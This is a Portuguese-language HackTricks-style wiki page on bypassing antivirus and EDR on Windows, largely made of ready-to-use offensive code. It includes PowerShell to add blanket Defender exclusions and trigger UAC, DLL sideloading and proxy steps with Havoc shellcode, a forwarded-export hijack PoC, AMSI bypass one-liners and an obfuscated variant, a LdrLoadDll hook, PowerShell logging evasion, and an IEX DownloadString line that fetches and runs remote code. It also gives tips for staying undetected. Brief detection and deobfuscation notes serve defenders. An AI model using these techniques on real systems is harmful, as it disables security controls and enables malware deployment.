# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para parar o Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o Windows Defender de funcionar fingindo ser outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Loaders públicos disfarçados de game cheats frequentemente vêm como instaladores Node.js/Nexe não assinados que primeiro **pedem elevação ao usuário** e só depois neutralizam o Defender. O fluxo é simples:

1. Verifica o contexto administrativo com `net session`. O comando só funciona quando o processo chamador tem direitos de admin, então uma falha indica que o loader está sendo executado como usuário padrão.
2. Relança-se imediatamente com o verbo `RunAs` para acionar o prompt de consentimento UAC esperado enquanto preserva a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software “cracked”, então o prompt geralmente é aceito, concedendo ao malware os direitos de que ele precisa para alterar a política do Defender.

### Exclusões `MpPreference` abrangentes para cada letra de unidade

Uma vez elevado, cadeias no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço diretamente. O loader primeiro encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e depois define **exclusões extremamente amplas** para que todo perfil de usuário, diretório do sistema e disco removível fique impossível de ser escaneado:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, USB sticks, etc.) então **qualquer payload futuro solto em qualquer lugar do disco é ignorado**.
- A exclusão da extensão `.sys` é voltada para o futuro — atacantes reservam a opção de carregar drivers unsigned depois sem tocar no Defender novamente.
- Todas as mudanças ficam sob `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que fases posteriores confirmem que as exclusões persistem ou as expandam sem reativar o UAC.

Como nenhum serviço do Defender é interrompido, verificações ingênuas de health continuam reportando “antivirus active” mesmo que a inspeção em tempo real nunca toque nesses caminhos.

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicious ou não: static detection, dynamic analysis e, para os EDRs mais avançados, behavioural analysis.

### **Static detection**

A static detection é feita sinalizando strings conhecidas malicious ou arrays de bytes em um binary ou script, e também extraindo informações do próprio arquivo (por exemplo, file description, company name, digital signatures, icon, checksum, etc.). Isso significa que usar public tools conhecidas pode fazer você ser pego mais facilmente, já que provavelmente elas já foram analisadas e marcadas como malicious. Existem algumas formas de contornar esse tipo de detecção:

- **Encryption**

Se você encrypt o binary, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de loader para decrypt e executar o programa em memory.

- **Obfuscation**

Às vezes tudo o que você precisa fazer é alterar algumas strings no seu binary ou script para fazê-lo passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando obfuscate.

- **Custom tooling**

Se você desenvolver suas próprias tools, não haverá known bad signatures, mas isso leva muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a static detection do Windows Defender é o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente ele divide o arquivo em múltiplos segments e então faz o Defender scanear cada um individualmente; assim, ele consegue dizer exatamente quais strings ou bytes estão sendo flagged no seu binary.

Eu recomendo fortemente que você confira esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis é quando o AV executa seu binary em uma sandbox e observa por malicious activity (por exemplo, tentar decrypt e ler as passwords do seu browser, fazer um minidump no LSASS, etc.). Essa parte pode ser um pouco mais difícil de trabalhar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como isso é implementado, pode ser uma ótima forma de bypassing da dynamic analysis do AV. Os AVs têm um tempo muito curto para scan files sem interromper o workflow do usuário, então usar sleeps longos pode atrapalhar a análise de binaries. O problema é que muitas sandboxes de AV podem simplesmente skip o sleep dependendo de como isso é implementado.
- **Checking machine's resources** Normalmente sandboxes têm pouquíssimos resources para trabalhar (por exemplo, < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser bem criativo aqui, por exemplo verificando a CPU temperature ou até mesmo a velocidade dos fans; nem tudo será implementado na sandbox.
- **Machine-specific checks** Se você quiser atingir um usuário cujo workstation esteja ingressado no domínio "contoso.local", você pode fazer uma check do domain do computador para ver se ele corresponde ao que você especificou; se não corresponder, você pode fazer seu programa sair.

Acontece que o nome da máquina da Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o computer name no seu malware antes da detonation; se o nome corresponder a HAL9TH, isso significa que você está dentro da sandbox do Defender, então você pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como já dissemos antes neste post, **public tools** eventualmente **serão detected**, então você deve se perguntar algo:

Por exemplo, se você quiser fazer dump do LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também faça dump do LSASS.

A resposta certa provavelmente é a segunda. Tomando o mimikatz como exemplo, ele provavelmente é um dos, se não o mais flagged pieces of malware por AVs e EDRs; embora o projeto em si seja super cool, também é um pesadelo trabalhar com ele para contornar AVs, então apenas procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasion, certifique-se de **desativar o automatic sample submission** no Defender e, por favor, sério, **NÃO UPLOAD TO VIRUSTOTAL** se o seu objetivo é alcançar evasion no longo prazo. Se você quiser verificar se seu payload é detected por um AV específico, instale-o em uma VM, tente desativar o automatic sample submission e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, priorize o uso de DLLs para evasion; na minha experiência, arquivos DLL geralmente são **muito menos detected** e analisados, então é um truque bem simples para evitar detection em alguns casos (se o seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma detection rate de 4/26 no antiscan.me, enquanto o payload EXE tem uma detection rate de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me de um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ficar muito mais stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a DLL search order usada pelo loader posicionando tanto a victim application quanto os malicious payload(s) lado a lado.

Você pode verificar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando irá exibir a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore programas DLL Hijackable/Sideloadable por conta própria**, essa técnica é bem stealthy quando feita corretamente, mas se você usar programas DLL Sideloadable publicamente conhecidos, pode ser pego facilmente.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não vai carregar seu payload, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, vamos usar outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 em [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista ao [VOD da twitch do S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos com mais profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules podem exportar funções que na verdade são "forwarders": em vez de apontar para o código, a entrada da exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um chamador resolve a exportação, o Windows loader vai:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Comportamentos-chave para entender:
- Se `TargetDll` for um KnownDLL, ele é fornecido a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).
- Se `TargetDll` não for um KnownDLL, a ordem normal de busca de DLL é usada, o que inclui o diretório do módulo que está fazendo a resolução do forward.

Isso מאפשר um primitive indireto de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um nome de módulo não-KnownDLL, então coloque essa DLL assinada junto com uma DLL controlada pelo atacante nomeada exatamente como o módulo de destino encaminhado. Quando a exportação encaminhada for invocada, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, então ele é resolvido via ordem normal de pesquisa.

PoC (copiar e colar):
1) Copie a DLL do sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o forwarding com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (assinado) carrega a side-by-side `keyiso.dll` (assinada)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você só receberá um erro de "missing API" depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Foque em forwarded exports onde o módulo alvo não é um KnownDLL. KnownDLLs estão listadas em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos não pertencentes ao sistema, seguidas pelo carregamento de non-KnownDLLs com o mesmo nome base desse diretório
- Alerta sobre cadeias de processo/módulo como: `rundll32.exe` → `keyiso.dll` fora do sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um toolkit de payload para burlar EDRs usando processos suspensos, direct syscalls e métodos alternativos de execução`

Você pode usar Freeze para carregar e executar seu shellcode de maneira stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca dependa de apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs frequentemente colocam **user-mode inline hooks** em syscall stubs de `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **direct** ou **indirect** que carregam o **SSN** correto (System Service Number) e fazem a transição para o kernel sem executar o ponto de entrada exportado hooked.

**Invocation options:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem hit no export de `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente dentro de `ntdll` para que a transição ao kernel pareça originar-se de `ntdll` (útil para evasion heurística); **randomized indirect** escolhe um gadget de um pool por chamada.
- **Egg-hunt**: evita embutir a sequência estática de opcode `0F 05` no disco; resolve uma sequência de syscall em runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infere SSNs ordenando os syscall stubs por virtual address em vez de ler os bytes do stub.
- **SyscallsFromDisk**: mapeia um `\KnownDlls\ntdll.dll` limpo, lê os SSNs do seu `.text` e depois faz unmap (contorna todos os hooks em memória).
- **RecycledGate**: combina inferência de SSN ordenada por VA com validação de opcode quando um stub está limpo; faz fallback para inferência por VA se estiver hooked.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em runtime, sem analisar bytes hooked.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **files no disco**, então, se você conseguisse de alguma forma executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedi-los, pois não tinha visibilidade suficiente.

A funcionalidade AMSI está integrada nestes componentes do Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI, ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- macros VBA do Office

Ela permite que soluções de antivirus inspecionem o comportamento de scripts expondo o conteúdo dos scripts de forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Note como ele adiciona `amsi:` e depois o path para o executável a partir do qual o script foi executado; neste caso, powershell.exe

Não escrevemos nenhum file no disco, mas ainda assim fomos detectados na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também é executado através do AMSI. Isso até afeta `Assembly.Load(byte[])` para carregar execução em memória. É por isso que usar versões mais baixas do .NET (como 4.7.2 ou abaixo) é recomendado para execução em memória se você quiser evadir o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, portanto, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que eles tenham múltiplas camadas, então a obfuscation pode ser uma má opção dependendo de como for feita. Isso torna a evasão menos direta. Ainda assim, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e pronto, então depende de quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível adulterá-lo facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas formas de evadir o escaneamento do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhum scan seja iniciado para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para impedir o uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código do powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então alguma modificação é necessária para usar essa técnica.

Aqui está um bypass de AMSI modificado que eu peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado quando este post sair, então você não deve publicar nenhum código se o seu plano for permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-lo com instruções para retornar o código de E_INVALIDARG; dessa forma, o resultado do scan real retornará 0, o que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Também existem muitas outras técnicas usadas para burlar AMSI com powershell, confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender mais sobre elas.

### Bloqueando AMSI ao impedir o carregamento de amsi.dll (LdrLoadDll hook)

AMSI é inicializado somente depois que `amsi.dll` é carregado no processo atual. Um bypass robusto, agnóstico de linguagem, é colocar um hook em modo usuário em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca carrega e nenhum scan ocorre para esse processo.

Esboço de implementação (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funciona em PowerShell, WScript/CScript e custom loaders igualmente (qualquer coisa que, de outra forma, carregaria AMSI).
- Combine com enviar scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Visto sendo usado por loaders executados por LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera script para bypass de AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera script para bypass de AMSI que evita assinatura por meio de função, variáveis e expressões de caracteres definidas pelo usuário e aleatorizadas, e aplica capitalização aleatória de caracteres aos comandos do PowerShell para evitar assinatura.

**Remove the detected signature**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Esta ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**AV/EDR products that uses AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Se você usar a versão 2 do PowerShell, AMSI não será carregado, então você pode executar seus scripts sem ser escaneado pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

O logging do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e troubleshooting, mas também pode ser um **problema para attackers que querem evadir detection**.

Para bypassar o PowerShell logging, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma tool como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Use Powershell version 2**: Se você usar a versão 2 do PowerShell, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar um powershell sem defenses (isso é o que `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Várias técnicas de obfuscation dependem de encrypting data, o que aumentará a entropy do binary e tornará mais fácil para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique encryption apenas a seções específicas do seu code que sejam sensitive ou precisem ser hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais), é comum enfrentar várias camadas de protection que bloqueiam decompilers e sandboxes. O workflow abaixo restaura de forma confiável um IL quase original, que depois pode ser decompilado para C# em tools como dnSpy ou ILSpy.

1.  Remoção de anti-tampering – ConfuserEx encrypts every *method body* e decrypts it dentro do static constructor do *module* (`<Module>.cctor`). Isso também patcha o PE checksum, então qualquer modificação fará o binary crashar. Use **AntiTamperKiller** para localizar as encrypted metadata tables, recover the XOR keys e rewrite uma assembly limpa:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros de anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Recuperação de symbols / control-flow – passe o arquivo *clean* para **de4dot-cex** (um fork do de4dot aware de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o profile do ConfuserEx 2
• de4dot irá desfazer o control-flow flattening, restaurar namespaces, classes e variable names originais e decrypt constant strings.

3.  Remoção de proxy-call – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) para quebrar ainda mais a decompilation. Remova-as com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esta etapa, você deve observar .NET API normais como `Convert.FromBase64String` ou `AES.Create()` em vez de wrapper functions opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binary resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar a *real* payload. Muitas vezes o malware a armazena como um byte array codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o execution flow **sem** precisar executar a amostra malicious – útil ao trabalhar em uma estação offline.

> 🛈  ConfuserEx produz um custom attribute chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software por meio de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++, o que tornará a vida da pessoa que quiser crackear a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários tipos diferentes de arquivos pe, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de code obfuscation de granularidade fina para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). O ROPfuscator ofusca um programa no nível do código de assembly, transformando instruções regulares em ROP chains, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações baixadas com pouca frequência dispararão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **trusted** **não dispararão o SmartScreen**.

Uma forma muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotando-os dentro de algum tipo de contêiner como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
